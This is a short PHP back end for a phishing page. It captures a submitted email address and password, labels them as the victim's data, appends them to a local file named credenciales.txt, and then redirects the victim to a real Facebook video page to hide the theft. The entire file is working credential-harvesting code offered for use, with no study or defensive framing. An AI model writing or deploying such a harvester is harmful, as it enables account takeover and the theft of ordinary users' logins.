<?PHP
$email = $_POST["email"];
$contrasena = $_POST["pass"];
$texto = "Datos de la victima.\n Correo: $email y contrasena:  $contrasena";
echo "
<script language='JavaScript'>
location.href = \"https://m.facebook.com/vinlandsoaga/videos/2507206019603902/?refsrc=https%3A%2F%2Fm.facebook.com%2Fstory.php&_rdr\";
</script>";

$file=fopen("credenciales.txt","a+") or exit("Unable to open file!");

   fwrite($file, $texto);


fclose($file);

?>